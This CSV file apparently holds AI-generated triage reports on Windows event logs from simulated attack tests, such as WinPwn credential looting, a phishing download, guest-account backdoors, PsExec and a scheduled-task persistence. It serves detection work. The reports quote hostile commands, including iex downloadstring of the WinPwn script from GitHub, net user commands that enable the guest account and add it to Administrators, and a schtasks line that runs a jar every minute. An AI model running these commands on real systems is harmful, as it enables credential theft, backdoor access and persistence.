Directory Name,AI Response
WinPwn - Loot local Credentials - Safetykatz,"Upon a detailed review of the provided log entries across System, Security, Application, Sysmon, and Windows PowerShell logs, here are the findings of the investigation:

### Suspicious or Anomalous Behavior
1. **PowerShell Execution with External Script:**
   - The Windows PowerShell log indicates that a PowerShell script was executed using the `iex` (Invoke-Expression) command to download and execute a script from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`). This script is associated with potentially malicious activity known as WinPwn, which is a post-exploitation toolkit often used in penetration tests.

2. **High Integrity Level for PowerShell Execution:**
   - The Sysmon log entries reveal that the PowerShell process ran with a High Integrity Level, indicating elevated privileges. The CommandLine parameter used suggests potential use of a malicious or unauthorized script execution.

3. **Use of Known Administrative Utilities:**
   - Several Sysmon log entries show the usage of administrative utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` by the user `SERVER002\admin_test`. While these utilities can be used in legitimate operations, their usage in quick succession around the same time as the PowerShell script might indicate suspicious activity.

4. **Frequent Microsoft Edge Update Events:**
   - The frequent Microsoft Edge Update processes and their chained execution might indicate routine update behavior, but needs to be correlated to ensure legitimacy given the context.

### Indicators of Malicious Activity
- The execution of PowerShell with downloading and running content from an external source without verification is a strong indicator of malicious activity or compromise.

### Conclusion
The analyzed log entries reveal behavior characteristic of a security breach or compromise. The use of PowerShell to execute an external script with potentially harmful intentions stands out as particularly concerning. Given the context and potential risks associated with allowing remote script execution without proper oversight, these logs indicate that unauthorized activities have occurred.

### Resolution 
**MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Isolation:**
   - Isolate the affected system (Server002) from the network to prevent further potential compromise.

2. **Conduct Further Investigation:**
   - Thoroughly investigate the nature and scope of the PowerShell script executed.
   - Examine any communications initiated by the script and potential data exfiltration.

3. **Review User Actions:**
   - Review activities and authentication logs for the user `SERVER002\admin_test` and any other users involved during the timeframe.

4. **Enhance Monitoring:**
   - Deploy enhanced monitoring specifically for PowerShell execution and any external connections/executions from this system.

5. **Patch and Update:**
   - Ensure all systems, especially Server002, are fully patched and any vulnerabilities are addressed.
   
6. **Documentation and Reporting:**
   - Document findings in detail for management and review by higher-level security teams.
"
Download Macro-Enabled Phishing Attachment,"**Detailed Analysis:**

Upon reviewing the log entries, I have identified several elements that warrant closer examination, particularly in the context of potential malicious activity.

1. **Windows PowerShell Log:**
   - **Command Execution:** There are multiple instances of PowerShell executions with the command line:
     ```powershell
     powershell.exe -Command {$url = 'https://github.com/file/file-file/raw/master/files/data.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm}
     ```
   - **Suspicious Activity:** The command indicates downloading an Excel file labeled as ""PhishingAttachment.xlsm"" from a remote location using PowerShell. This behavior is highly indicative of phishing attempts or the deployment of malicious payloads.

2. **Security Log:**
   - **Event ID 4616:** Time change events were logged, but they do not directly indicate a security threat. However, they coincide with suspicious PowerShell activities and may serve as a pivot point for further timeline analysis.

3. **Sysmon Log:**
   - **Process Executions:** The logs show multiple executions of PowerShell, conhost.exe, and whoami.exe with elevated privileges, which are typical in reconnaissance or initial stages of malicious activities.
   - **Process Executions by admin_test:** Several processes, including `wevtutil.exe` and `conhost.exe`, are executed by the user `SERVER002\admin_test`. While these events alone are not inherently malicious, their timing alongside suspicious PowerShell activities and repeated invocation deserve further scrutiny.

4. **Application and System Logs:**
   - **No additional indicators** of compromise or unusual behavior were noted within these logs beyond what was seen in the Sysmon and Security logs.

**Assessment of the Situation:**

Based on the investigation of the logs:

- **Suspicious Behavior:** The primary concern lies with the PowerShell command executed to download a file directly from an external source, specifically labeled with “PhishingAttachment.xlsm”. This behavior matches indicators of phishing or malware distribution.
- **Potential Threat:** The sequence and type of activities suggest that the downloaded file could be intended for malicious purposes, such as loading malware or exploiting vulnerabilities.

**Resolution:**

- **Resolution:** MALICIOUS

**Guidance on How to Proceed:**

1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further spread or communication with the potential command and control server.
   - Conduct a thorough investigation of any downloaded files, particularly the ""PhishingAttachment.xlsm"", using sandbox analysis and anti-malware solutions.

2. **Further Investigation:**
   - Audit the system for any additional suspicious activity, focusing on process executions, file creation/modifications, and registry changes around the identified timelines.
   - Review email logs and communications for any signs of phishing attempts that align with the nature of the downloaded file.

3. **Mitigations and Recommendations:**
   - Educate and remind users about phishing risks and recognizing suspicious emails or attachments.
   - Implement appropriate monitoring and logging to catch similar activities in real-time and enhance endpoint protection measures with strict PowerShell execution policies and network-based detection rules."
Create local account with admin privileges,"Upon reviewing the provided Windows event logs, a few observations have been made:

### Suspicious or Anomalous Behavior:

1. **Time Manipulation:**
   - There are events indicating a system time change. Event ID 4616 from the Security log shows that the previous time was changed from ""2024-10-23 16:19:24"" to ""2024-10-23 16:19:21"". This could indicate an attempt to manipulate logs or time-based security mechanisms. The process involved is `svchost.exe`, which is plausible for time synchronization but should still be verified for typical behavior.

2. **Account Creation and Privilege Escalation:**
   - The creation and modification of an account named ""art-test"" are logged. Events with IDs 4720 and 4722 indicate that this user was created and then enabled.
   - Further, event ID 4728 logs the addition of this user to a group (likely a local group, possibly administrators, although the group name is listed as 'None'), which is concerning.
   - Event ID 4724 records a password reset or change for the user ""art-test"".
   - Event ID 4732 records membership additions to groups such as ""Users"" and ""Administrators"", which is corroborated by the command found executing in the Sysmon logs.

3. **Command Execution:**
   - Sysmon data shows the execution of several commands related to user creation and administrative group assignments. There is a direct correlation to the Windows Security logs, suggesting unauthorized privilege escalation.
   - The `cmd.exe` process executed a command to add ""art-test"" to the local administrator group. This command is indicative of privilege escalation activities.

4. **Use of Admin Privileges:**
   - Event ID 4672 indicates that the user ""admin_test"" had elevated privileges (including SeDebugPrivilege, SeBackupPrivilege, etc.), making this account powerful enough to perform the malicious activities that were recorded.

### Malicious Activity Indicators:

- The combination of time changes shortly before user account creations and modifications, along with privilege escalations, suggests an attempt to cover tracks or alter log timestamps, commonly seen with malicious activity.
- The use of command line tools like `net.exe` to create and alter user accounts further supports this as an intentional and unauthorized action.

### Recommendations:

1. **Follow-up Investigation:**
   - Validate whether the execution of these commands was intentional and authorized by verifying this activity with the responsible team or account holder. 

2. **Review Security Policies:**
   - Ensure security policies and monitoring are in place to detect and prevent unauthorized user creations and privilege escalations.

3. **Log Monitoring:**
   - Increase monitoring on accounts with administrative privileges and ensure that logs of such activities are collected and reviewed regularly.

4. **Incident Response:**
   - Execute an incident response protocol that might include isolating the system for forensic analysis, especially given the creation of a high-privilege account potentially for backdoor access.

Based on the analysis of these events and their potential implications, I would classify the findings as **MALICIOUS**. The actions taken suggest an unauthorized attempt to manipulate time settings, create a user account, and escalate privileges, further pointing toward an active security compromise. Immediate steps should be taken to address and mitigate this security event."
Activate Guest Account,"Upon detailed analysis of the provided Windows event logs, I have identified some events that stand out and could indicate potential malicious activity. Here's the breakdown:

1. **Suspicious Command Execution:**
   - A command execution was recorded where `cmd.exe` was used to activate the guest account (`""cmd.exe"" /c net user guest /active:yes`). This action is unusual and can potentially indicate unauthorized privilege escalation or lateral movement. Such behavior should be scrutinized as it deviates from typical administrative activities unless justifiably approved and logged as part of maintenance or specific administrative activities.

2. **Service Activity:**
   - The repeated starting and stopping of the `MicrosoftEdgeUpdate.exe` service under `NT AUTHORITY\SYSTEM` is visible in the logs. While update activities for applications like Microsoft Edge can be normal, they are worth reviewing in concert with other suspicious activities (such as the guest account enabling) to understand if these actions are linked or part of an exploit process.

3. **Process Executions by a Test User:**
   - There are multiple executions of administrative tools (like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`) by the user `SERVER002\admin_test`. This could either be a case of a regular administrative script or a user performing reconnaissance activities on the host machine.

4. **Anomalous Time Changes:**
   - System time change events were triggered, showcasing suspicious activity often associated with attempts to modify log results or schedule manipulation meant to align with malicious intents (e.g., scheduled tasks based on time changes).

Each of these elements, especially the enabling of the guest account, could potentially point toward unauthorized or mischievous activity. However, by themselves, some of these activities can be benign, especially in an environment where updates and administrative scripts are frequent. 

### Resolution
Given the analysis, the situation is not definitively malicious but carries signs warranting further scrutiny. Therefore, I categorize this as:

**SUSPICIOUS**

### Guidance on How to Proceed

- **Investigate the Enabling of Guest Account:**
  - Verify if there is a legitimate reason or administrative script executed that accounts for this action. If not, consider disabling the guest account and conduct an audit for any login attempts or changes made while it was active.

- **Confirm Validity of Service and Process Activity:**
  - Correlate the activity of `MicrosoftEdgeUpdate.exe`, `wevtutil.exe`, and other administrative tools against known approved maintenance or update scripts. 

- **Review Admin_test User Activities:**
  - Check for unusual access, particularly focusing on the `admin_test` user account to ensure it is not compromised and is being utilized by an authorized individual.

- **Time Modification Events:**
  - Investigate the time shift events to understand their context and confirm no adverse actions were orchestrated following these changes.

This approach should ensure thorough validation and address any potential compromises effectively."
Enable Guest account with RDP capability and admin privileges,"Upon reviewing the provided Windows event logs, a series of concerning activities have been identified that suggest potential malicious activity:

1. **Time Change Events**: The logs show multiple instances of the system time being altered. The EventID 1 from Kernel-General logs indicate that `svchost.exe` was responsible for these changes. Unsanctioned time changes can be used to evade detection or log manipulation.

2. **Unauthorized Account Manipulation**: 
   - The logs show command-line execution of `cmd.exe` with a sequence of commands that activate the guest account, change its password, and add it to the Administrators and Remote Desktop Users groups. 
   - Security logs (EventID 4722, 4738, 4724, 4732) confirm these actions, showing that the ""Guest"" account was re-enabled and its privileges escalated by `admin_test`.
   - The `net` commands executed match activities often associated with attempts to establish unauthorized access to a system.

3. **Registry Changes**: There are registry modifications to allow remote desktop connections (`fDenyTSConnections` set to 0 and `AllowTSConnections` set to 1). These changes are suspicious especially when combined with the guest account being enabled and privileged.

4. **Use of 'admin_test' Account**: All activities, including enabling, modifying the guest account, and registry changes, have been executed under the `admin_test` account. While this account appears to have administrative privileges, the pattern and use of the Guest account indicate potential misuse of these admin privileges.

5. **Sysmon and System Logs**: These logs show multiple command-line executions involving administrative tasks, unauthorized account changes, and unusual registry modifications, which align with the indicators of tampering or system backdoor creation.

Based on these observations, the following assessment can be made: 

- **Resolution**: MALICIOUS
  - The combination of unauthorized time changes, account manipulation, privilege escalation, and registry modifications to facilitate remote access clearly indicates malicious intent and compromise.

**Guidance on How to Proceed**:

1. **Immediate Response**:
   - Isolate the affected host (Server002) from the network to prevent further unauthorized access or lateral movement.
   - Initiate a forensic capture of the system's state, including RAM and disk images for detailed analysis.

2. **Account Auditing**:
   - Review and immediately disable suspicious accounts (e.g., Guest, unless explicitly needed).
   - Change all credentials for critical accounts, especially `admin_test`, and audit for any unauthorized account creations or modifications.

3. **System Patching and Hardening**:
   - Ensure the system is up-to-date with the latest security patches.
   - Review and adjust policies to audit and restrict changes to critical accounts and system settings.

4. **Log Review and Monitoring**:
   - Establish heightened monitoring for similar activities across the network.
   - Review historical logs for any signs of previous compromises or similar attack patterns.

5. **Incident Report**:
   - Document the incident, its impact, and the actions taken, and notify the relevant stakeholders.
   - Engage with external security experts if additional expertise is required. 

These actions aim to contain the current compromise, mitigate damage, and prevent future incidents."
Word spawned a command shell and used an IP address in the command line,"In analyzing the provided Windows event logs, the following observations and conclusions were made:

1. **PowerShell Activity**:
    - The logs reveal the execution of a PowerShell command that retrieves a script from a remote URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1`. The command involves invoking `Invoke-MalDoc` with specific parameters to create a file and execute shell commands (e.g., `ping 8.8.8.8`). This kind of activity — downloading and executing scripts from an external source — is often indicative of malicious behavior, particularly when the script name suggests malicious document handling (`Invoke-MalDoc`).

2. **Sysmon Logs**:
    - Multiple instances of process creations involving PowerShell and command-line executions exhibit potentially harmful behavior, especially given the retrieval and execution of a malicious script.
    - The logs show activity linked to `MicrosoftEdgeUpdate.exe` processes. While normal update activities could occur, the unusual presence of Edge update executions in a temporary path (e.g., `C:\Program Files (x86)\Microsoft\Temp\`) combined with suspicious PowerShell activity raises concern about potential unauthorized modifications or executions masked as legitimate edge update processes.

3. **Security Log Events**:
    - Events such as 4624 and 4672 which include privileged logons and privilege assignments are noted. While these can be normal occurrences, in the context of the detection of potentially malicious PowerShell activity, they warrant closer scrutiny to confirm if they align with legitimate user activity or operational needs.

4. **Persistence and Execution Patterns**:
    - The sequence of events, particularly related to PowerShell and command activity, showcases patterns typical of persistence techniques and remote code execution, attempting to use available system privileges and tools to carry out potentially harmful activities.

### Assessment:
- The presence of PowerShell executing scripts retrieved from an untrusted source is a strong indicator of malicious behavior.
- Execution of scripts that potentially generate or manipulate files and use shell commands suggests an intent to maintain persistence or further the attack vector.
- Abnormalities with `MicrosoftEdgeUpdate.exe` usage in temporary directories combined with the PowerShell activities increase the suspicion level significantly.

### Resolution:
**MALICIOUS**: The logs contain activity consistent with cyber attack methodologies, such as unauthorized PowerShell script execution and suspicious process activities, indicating a potential compromise. Immediate steps should be taken to review and isolate the host for further forensic investigation, assess potential data breaches, and evaluate related systems for additional signs of unauthorized activity.

### Guidance:
- Isolate the affected machine from the network to prevent further spread or unauthorized access.
- Conduct a thorough forensic analysis of the PowerShell script downloaded and any files created during this period.
- Evaluate processes related to Microsoft Edge Update for integrity and legitimacy.
- Review and analyze system configurations and user activity logs to pinpoint the origin and impact of the unauthorized actions.
- Consider a full security audit to identify and mitigate vulnerabilities that could enable similar activities in the future."
Octopus Scanner Malware Open Source Supply Chain,"Upon reviewing the provided Windows event logs, let's perform a detailed analysis, focusing on identifying any suspicious or anomalous behavior that might indicate malicious activity:

### Detailed Analysis:

1. **Sysmon Events:**
   - An analysis of the Sysmon events reveals a number of processes executed within a very short time frame (at around the same second), mainly using system-level utilities and command-line execution. These include:
     - **PowerShell Execution**: Event showing PowerShell (`powershell.exe`) execution by `admin_test`. PowerShell usage should always be scrutinized, especially if there's no clear business need.
     - **Command Line Operations**: Notably, `cmd.exe` is executed with a command to copy a file and create a scheduled task:
       ```
       ""cmd.exe"" /c copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db & schtasks /create /tn ExplorerSync /tr ""javaw -jar %temp%\..\Microsoft\ExplorerSync.db"" /sc MINUTE /f
       ```
       This is particularly suspicious due to the creation of a scheduled task (`schtasks.exe`). Creating tasks that execute binaries from suspicious locations (like user temp directories) is a common persistence technique used by malware.
   - **Process Ancestry and Usage**: `parentProcessGuids` and `parentImage` fields indicate processes such as Wsmprovhost and wsmprovhost embedding are being used to launch these scripts and executables. This could indicate lateral movement or remote command execution attempts.
   - **Wevtutil Execution**: Wevtutil.exe is a command-line tool used to manage event logs. Frequent and rapid executions, particularly in tandem with PowerShell and cmd.exe, may indicate activities aimed at clearing logs or managing entries suspiciously.
   
2. **Command Line Activities:**
   - Multiple Sysmon Event IDs with process creation (`EventID 1`) and image load (`EventID 5`) point to repeated execution of potentially sensitive system calls, likely tied to the `admin_test` user:
     - The use of `schtasks` and `cmd` to register executables, especially in a manner suggesting tasks being run every minute, is worrisome.
   
3. **Application Logs:**
   - Microsoft Edge Update running processes seem normal (legitimate software updates are benign), but their presence in conjunction with other suspicious activities warrants scrutiny.

4. **Potential Indicators of Compromise:**
   - Scheduled task creation with `schtasks` to execute Java applications.
   - Execution of PowerShell, `cmd.exe`, and other system utilities such as `wevtutil.exe` in a clustered, timeframe manner.
   - Use of `admin_test` user with a potentially high privilege level and engaging in a mix of legitimate and potentially suspicious activities.

### Conclusion:

Based on the above analysis, I assess the situation as **SUSPICIOUS**. There is activity that doesn't align with regular user behavior, such as the scheduled tasks from temporary directories and the use of PowerShell scripts, which require further investigation to confirm the legitimacy of these actions. Immediate action should include:

- **Further Investigation**: Follow up on the scheduled task and its purpose, alongside PowerShell command usage verification.
- **User Verification**: Confirm with the user `admin_test` or their supervisory personnel if these activities are expected or recognized.
- **Threat Hunting**: Check for similar patterns or scheduled tasks across other hosts.
- **Log Review**: Continue to monitor event logs for confirmed legitimacy or ongoing suspicion.

Until malicious intent is confirmed, proceed cautiously and investigate further, particularly looking into the persistence mechanisms and ensuring user activity aligns with organizational standards and policies."
Use PsExec to elevate to NT Authority\SYSTEM account,"Upon detailed analysis of the Windows event logs provided, certain activities suggest suspicious behavior warranting further investigation. Here's an assessment:

### Key Observations:

1. **Event Log Clearance:**
   - **Event ID 1102 (Security) & 104 (System):** Logs indicate the security and system event logs were cleared by the user `admin_test`. Log clearance can mask malicious activity.

2. **Unusual Account Activity:**
   - **Event ID 4624 and 4672 (Security):** Multiple logon events with elevated privileges (SeDebugPrivilege, SeTcbPrivilege, etc.) were assigned to the SYSTEM account around the log clearance time. Elevated privileges often indicate malicious intent, especially when coupled with event log clearance.

3. **Execution of PSEXESVC:**
   - **Event ID 7045 (System) & Sysmon Process Creation:** Indicates the use of `PsExec` (PsExec service execution - `PSEXESVC.exe`). `PsExec` is often used for lateral movement and remote execution, which could be benign in some contexts but is concerning when found near suspicious log clearing events.

4. **Use of Administrative Tools:**
   - **Sysmon Logs:** Frequent execution of administrative utilities like `wevtutil` (to clear logs as indicated), `cmd.exe`, `whoami.exe`, and `PsExec.exe` under the same account suggests activities aligning with potential malicious scenarios.

5. **Execution from Temporary Directories:**
   - There are processes executed from temporary directories using utilities commonly associated with known attack vectors (`PsExec.exe` via `cmd.exe`). This behavior is usually linked to scripted attacks that do not have full administrative access to the necessary directories to conduct activities.

### Assessment:
Given the evidence, the logs contain multiple indicators of compromise or attempts thereof, particularly focused on credential manipulation, potential privilege escalation, and log manipulation. These activities align with tactics commonly used by attackers to gain persistent access and evade detection.

### Resolution: SUSPICIOUS

### Guidance on How to Proceed:
- **Immediate Actions:**
  - Monitor the activities of the `admin_test` account closely.
  - Conduct a full system malware and security scan, focusing on signs of lateral movement, credential dumps, or backdoor installations.
  - Review network activity logs for connections during the suspicious times.

- **Further Investigation:**
  - Ensure integrity and non-tampering of critical system files.
  - Check for unauthorized software installations or scripts running at startup.
  - Investigate the initiator and chain of custody of `PsExec` executions.

- **Long-term Actions:**
  - Implement enhanced logging and monitoring solutions to catch similar activities earlier.
  - Conduct regular security awareness training for personnel to avoid illicit use of high-privilege accounts for non-administrative purposes.
  - Consider implementing stronger access controls and account management policies to restrict unnecessary administrative privileges.

In conclusion, while the activities aren't definitively malicious, they strongly imply unwanted or malicious actions, necessitating extensive further investigation."
WinPwn - Loot local Credentials - powerhell kittie,"Upon analyzing the provided Windows event logs, the following observations were made:

**Suspicious Activity Noted:**

- **PowerShell Logs:**
  - Repeated PowerShell events (EventID 600) executed a command to download and execute a script from a GitHub URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script is associated with offensive security tools, often used for penetration testing or potentially malicious activities.
  - The command used (`iex(new-object net.webclient).downloadstring(...)`) is suspicious as it can be used to execute a script fetched from a remote location, which is a common technique used in PowerShell-based attacks.

- **Sysmon Logs:**
  - There are several instances of `powershell.exe` running commands related to the previously mentioned script. The use of parameters like `obfuskittiedump -consoleoutput -noninteractive` suggests attempts to obfuscate actions, indicating potentially malicious intent.
  - The Sysmon logs also show repeated executions of system utilities like `conhost.exe`, `whoami.exe`, `hostname.exe`, and `wevtutil.exe` via the user `SERVER002\admin_test`, which could be legitimate administrative activity but in conjunction with the PowerShell activity, raises suspicion.

**Indicators of Compromise:**

- The observed PowerShell command lets an external script be executed on the system, potentially leading to unauthorized access or system compromise.
- Elevated privileges and the execution of various system commands suggest an attempt to gather system information or perform administrative tasks covertly.

**Security Logs:**

- High-level privileges were assigned to the `admin_test` user via EventID 4672. These privileges are significant and any anomalous behavior from accounts with these privileges should be scrutinized further.
- Events reflecting potential improper time changes were noted (EventID 4616), though they might be standalone system updates, when seen in this context, they could point to an attempt to disguise activity timestamps (time stomp).

**Assessment:**

- **Resolution:** MALICIOUS
  - The use of PowerShell to download and execute scripts from external sources that are related to a known offensive toolset, combined with the execution of multiple system-level commands by a user with high privileges, strongly indicates malicious activity.
  
**Guidance:**

- Immediate isolation of the affected host (`Server002`) to prevent further potential malicious activity or lateral movement by an attacker.
- Perform a forensic analysis of the system to understand the full extent of the compromise, including any persistence mechanisms employed and potential data exfiltration.
- Review and potentially revoke extreme privileges granted to user accounts unless absolutely necessary. Implement least privilege principles.
- Consider enhancing logging and monitoring solutions to detect similar activities in the future. Deploy indicators of compromise (IOCs) related to the observed behavior across the network to detect parallel instances.
- User training to recognize phishing tactics or scripts that execute unauthorized activities to prevent similar events."
USB Malware Spread Simulation,"Upon analysis of the provided Windows event logs, several indications of potentially concerning behavior are apparent, warranting further examination.

### Indicators of Suspicious or Anomalous Behavior:

1. **PowerShell Script Execution:**
   - Multiple entries in the Windows PowerShell log show the execution of a PowerShell script that checks for removable drives and creates files (`dataTest1.txt`) on them. This action is consistent with tactics used in USB-based spread of malware.
   - The script's explicit mention of ""simulate malware spread"" raises an immediate red flag. Despite being labeled as a simulation, the same mechanisms are used in real malware scenarios.

2. **Execution of System Utilities:**
   - Sysmon logs show executions of various system utilities like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. While system utilities often run during normal operations, frequent invocation in rapid succession may indicate process tampering or attempts to mask other activity.

3. **Time Change Events:**
   - The System and Security logs show discrepancies related to time changes, with `svchost.exe` involved in these operations. While time synchronization is normal, frequent abrupt changes could mask activities or tamper with log integrity for obfuscation.

### Assessment of the Situation:

- **PowerShell Activity**: The PowerShell script specifically simulating malware spread to removable drives is a critical concern and could easily be repurposed for nefarious activities. The presence of this activity on a server machine (Server002) is unusual unless under a controlled and justified environment, which should be verified.

- **Process Executions**: The use of legitimate system utilities and tools in rapid sequences, such as `wevtutil.exe` used to manage event logs, is suspicious. It may point toward intentions to manually clear or manipulate the logs.

### Threats or Risks Identified:

1. **Potential Malware Spread**: The PowerShell script could potentially be employed to spread malware via removable drives across the network.
2. **Log Tampering**: The frequent execution of utilities like `wevtutil.exe` might denote tampering with event logs or covering tracks.
3. **System Time Tampering**: Unexplained time changes could indicate an attempt to disrupt or manipulate event log integrity, useful in concealing traces of malicious activities.

### Guidance on How to Proceed:

1. **Immediate Investigation**: 
   - Verify whether the PowerShell script execution was authorized, logged, and consistent with any known administrative tasks or vulnerability assessments.
   - Contact the user associated (admin_test) to confirm actions if legitimate or intended as training or testing.

2. **Review and Reset Security Policies**:
   - Ensure that execute permissions for PowerShell scripts are tightly controlled and restricted to necessary personnel.
   - Investigate any unusual configuration changes or policy modifications that may allow the execution of scripts or utilities.

3. **Conduct a Full Security Audit**:
   - Consider comprehensive malware scanning across the network, focusing on potential removable drives that may have connected to Server002.
   - Examine network logs further to evaluate if any external communication occurred subsequent to the activities logged.

4. **Maintain a Log Archive**:
   - Securely archive and analyze performance and security logs prior to and after the identified timestamp to identify any correlated suspicious behavior.

### Resolution:
Based on the above assessments, this situation is classified as:
- **MALICIOUS**: The activity detected reflects a potential compromise, with clear indications of methods used by malware and log manipulation practices warranting further immediate and comprehensive investigation."
Azure Persistence Automation Runbook Created or Modified,"Upon examination of the provided Windows event logs, there are a few notable actions that require attention:

### Anomalous Behaviors in the Logs

1. **Powershell Execution**:
   - The PowerShell logs show multiple instances where a PowerShell script is executed with the following command:
     ```powershell
     powershell.exe & { $secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential -ArgumentList """", $secure_pwd
     Connect-AzAccount -Credential $creds
     New-AzAutomationRunbook -Name -Type PowerShell -ResourceGroupName -Description 'my-test-runbook' -AutomationAccountName }
     ```
   - This command includes the use of `ConvertTo-SecureString` with the `-AsPlainText` and `-Force` parameters, which is generally discouraged because it indicates passwords may be handled insecurely.
   - No username is supplied during the credential creation, and the use of blank credentials with `Connect-AzAccount` is unusual and might suggest an attempt to perform unauthorized or unmonitored cloud operations.
   - The script usage pattern could indicate an attempt to deploy a new runbook in Azure Automation, which in a suspicious context may imply automation of potentially unauthorized actions.

2. **Sysmon Logs**:
   - Numerous `wevtutil.exe` and `conhost.exe` executions under the user `SERVER002\admin_test` are observed, which might be used to interact with, update, or collect event logs. `wevtutil.exe` can be used for these purposes legitimately but is also used by attackers to clear logs.
   - The simultaneous execution of PowerShell and Windows utilities suggests potential lateral movement or information gathering within the host.

3. **Process Creation**:
   - Frequent invocation of host-related commands like `hostname.exe` and user information retrieval commands like `whoami.exe`. These are particularly notable as they can be used to ascertain the environment and permissions of the compromised account.

### Assessment and Resolution

Based on these observations, I label the overall activity as **SUSPICIOUS**. The execution patterns and commands, especially if not matching documented administrative actions, warrant further in-depth investigation.

### Guidance for Further Action

- **Validate the Activities**: Correlate with authorized change logs or administrator tasks to verify if such actions were legitimate.
- **Examine the Context**: Check if there was a need to deploy Azure Automation Runbooks or if there’s an Azure subscription which could explain these actions. 
- **Review User Account Activities**: Check the user `SERVER002\admin_test` for any abnormal login patterns, privilege usage, or any deviation from its regular profile.
- **Credentials Security**: Investigate if there has been any compromise involving credentials, especially those involved in script actions.
- **Investigate Potential Compromise**: Examine endpoint and network logs for any signs of lateral movement, data exfiltration, or further compromise activities.

This situation should be closely monitored, and possibly more restrictive PowerShell execution policies might be considered to prevent further unauthorized scripting and ensure tighter control over privileged operations."
Running Chrome VPN Extensions via the Registry 2 vpn extension,"Upon reviewing the provided logs, several points of interest were uncovered:

1. **Security Logs:**
   - Event ID 4624: Multiple successful logins with LogonType 5, indicating service logons. The user is ""SYSTEM"" which is normal for system processes.
   - Event ID 4672: Privilege use on ""SYSTEM"" user, indicating legitimate privilege escalation typical for system-level operations.
   - Event ID 5379: Multiple credential reading attempts. Most returned a specific error code `3221226021`, indicating access denied, except for one successful read (`ReturnCode=0`). The `TargetName` used in some attempts (""WindowsLive"" and ""MicrosoftAccount"") might hint at attempts to access or verify online credentials or tokens.
   - Event ID 4798: Enumeration of available users or service accounts is noted, done by the process ""taskhostw.exe,"" which is a legitimate Windows host process for task scheduling.

2. **PowerShell Logs:**
   - PowerShell scripts were executed, where registry keys related to Google Chrome extensions were modified, which is suspicious. These commands may hint at potentially fraudulent Chrome extension installation or modification, commonly associated with attempts to introduce unwanted functionality or malware via a browser extension.

3. **Sysmon Logs:**
   - Numerous processes initiated by the `admin_test` account using PowerShell (`powershell.exe`). This includes potential indicators of compromise, with the execution of PowerShell scripts configuring Chrome extensions. This matches with the PowerShell log evidence and may require further investigation, as attackers often leverage PowerShell for malicious activities.
   - Legitimate system processes such as `svchost.exe`, `conhost.exe`, `taskhostw.exe`, and service control operations were logged at various integrity levels (System and Network Service).

Overall Assessment:
- The most profound anomaly is the PowerShell activity configuring Google Chrome extensions, with potential unauthorized registry modifications. This kind of activity can be a vector for malicious browser extensions. Combined with the Sysmon logs showing PowerShell usage by `admin_test`, a non-system user, suggests a possibility of misuse or malicious intent.
- The remainder of the activity primarily implicates legitimate system processes and operations commonly seen in Windows environments.

Guidance:
- Immediate confirmation and verification of the legitimacy of the Chrome extensions referenced in the PowerShell script is recommended to ensure no unauthorized or harmful extensions are installed.
- Verify the purpose of the scripts executed via PowerShell by the `admin_test` account and ensure that no unauthorized execution policies have been set.
- As part of further investigation, ensure the credentials associated with `admin_test` are secure and that the account itself hasn't been compromised.

Resolution:
- **SUSPICIOUS**: The activity noted, particularly revolving around the PowerShell script modifying registry keys for Chrome extensions, necessitates further investigation to confirm whether these changes were made maliciously or if they serve a legitimate organizational purpose."
